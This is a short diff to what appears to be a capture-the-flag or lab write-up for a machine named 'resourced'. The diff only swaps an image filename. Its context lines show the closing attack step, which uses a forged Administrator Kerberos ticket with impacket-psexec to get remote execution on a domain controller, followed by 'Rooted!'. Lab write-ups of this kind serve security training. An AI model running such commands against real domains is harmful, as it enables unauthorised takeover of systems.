@@ -331,6 +331,6 @@ $ export KRB5CCNAME=./Administrator.ccache
 $ sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.219.175
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>
 
 Rooted!
